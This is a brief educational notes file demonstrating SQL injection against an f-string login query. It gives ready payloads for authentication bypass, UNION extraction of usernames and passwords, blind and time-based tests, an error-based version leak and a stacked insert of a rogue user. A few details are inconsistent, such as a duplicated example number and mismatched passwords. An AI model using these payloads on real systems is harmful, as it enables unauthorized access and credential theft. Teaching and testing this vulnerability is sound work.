# SQL Injection Examples for Educational/Security Testing

These examples show various SQL injection techniques that exploit the vulnerable string interpolation pattern. The key vulnerability is that user input is directly concatenated into the SQL query without proper sanitization or parameterization.

## Key injection types demonstrated:

1. Authentication bypass - Using OR conditions to always return true
1. Union attacks - Combining results from multiple queries to extract data
1. Blind injection - Testing conditions when you can't see direct output
1. Time-based attacks - Using delays to confirm successful injection
1. Error-based - Forcing database errors that reveal information
1. Stacked queries - Executing multiple SQL statements

# Vulnerable pattern: f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# Example 1: Authentication bypass using OR condition

username = "admin' OR True=True -- "
password = "anything"

> SELECT * FROM users WHERE username = 'admin' OR True=True -- ' AND password = 'dsdsds'

# Example 1: Authentication bypass using OR condition

username = "admin' OR '1'='1' -- "
password = "anything"

> SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'anything'
  The -- comments out the password check, '1'='1' is always true

# Example 2: Union-based injection to extract data. X

username = "admin' UNION SELECT username, password FROM users -- "
password = "anything"

> SELECT * FROM users WHERE username = 'admin' UNION SELECT username, password FROM users -- ' AND password = 'anything'
  Returns all usernames and passwords from the users table

# Example 3: Boolean-based blind injection

username = "admin' AND (SELECT COUNT(*) FROM users) > 0 -- "
password = "anything"

> SELECT * FROM users WHERE username = 'admin' AND (SELECT COUNT(*) FROM users) > 0 -- ' AND password = 'anything'
  Tests if users table exists based on query success/failure

# Example 4: Time-based blind injection. X

username = "admin'; WAITFOR DELAY '00:00:05' -- "
password = "anything"

> Resulting query: SELECT * FROM users WHERE username = 'admin'; WAITFOR DELAY '00:00:05' -- ' AND password = 'anything'
  Causes 5-second delay if injection works (SQL Server syntax)

# Example 5: Error-based injection. XX

username = "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- "
password = "anything"

> Forces MySQL error that reveals database version information

# Example 6: Stacked queries (if supported)

username = "admin'; INSERT INTO users VALUES ('hacker', 'password123'); -- "
password = "anything"

Attempts to insert a new user record
